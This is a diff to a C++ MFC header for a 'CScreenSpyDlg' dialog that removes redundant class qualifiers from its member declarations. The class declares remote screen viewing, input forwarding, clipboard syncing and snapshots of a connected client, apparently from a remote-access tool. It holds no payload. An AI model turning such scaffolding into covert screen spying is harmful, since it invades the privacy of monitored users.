@@ -8,25 +8,25 @@ class CScreenSpyDlg : public CDialog
 	DECLARE_DYNAMIC(CScreenSpyDlg)
 
 public:
-	CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer=NULL, CONTEXT_OBJECT *ContextObject=NULL);   
+	CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer=NULL, CONTEXT_OBJECT *ContextObject=NULL);   
 	virtual ~CScreenSpyDlg();
 
 	CONTEXT_OBJECT* m_ContextObject;
 	IOCPServer*     m_iocpServer;
 
-	VOID CScreenSpyDlg::SendNext(void);
-	VOID CScreenSpyDlg::OnReceiveComplete();
+	VOID SendNext(void);
+	VOID OnReceiveComplete();
 	HDC  m_hFullDC;        
 	HDC  m_hFullMemDC;
 	HBITMAP	m_BitmapHandle;
 	PVOID   m_BitmapData_Full;
 	LPBITMAPINFO m_BitmapInfor_Full;
-	VOID CScreenSpyDlg::DrawFirstScreen(void);
-	VOID CScreenSpyDlg::DrawNextScreenDiff(void);
+	VOID DrawFirstScreen(void);
+	VOID DrawNextScreenDiff(void);
 	BOOL         m_bIsFirst;
 	ULONG m_ulHScrollPos;
 	ULONG m_ulVScrollPos;
-	VOID CScreenSpyDlg::DrawTipString(CString strString);
+	VOID DrawTipString(CString strString);
 
 	HICON  m_hIcon;
 	HICON  m_hCursor;
@@ -34,17 +34,17 @@ public:
 	BYTE m_bCursorIndex;
 	CString  m_strClientIP;
 	BOOL     m_bIsTraceCursor;
-	VOID CScreenSpyDlg::SendCommand(MSG* Msg);
+	VOID SendCommand(MSG* Msg);
 
-	VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength);
-	VOID CScreenSpyDlg::SendServerClipboard(void);
+	VOID UpdateServerClipboard(char *szBuffer,ULONG ulLength);
+	VOID SendServerClipboard(void);
 
 	BOOL  m_bIsCtrl;
 	LPBYTE m_szData;
 	BOOL  m_bSend;
 	ULONG m_ulMsgCount;
 
-	BOOL CScreenSpyDlg::SaveSnapshot(void);
+	BOOL SaveSnapshot(void);
 	// 对话框数据
 	enum { IDD = IDD_DIALOG_SCREEN_SPY };
 
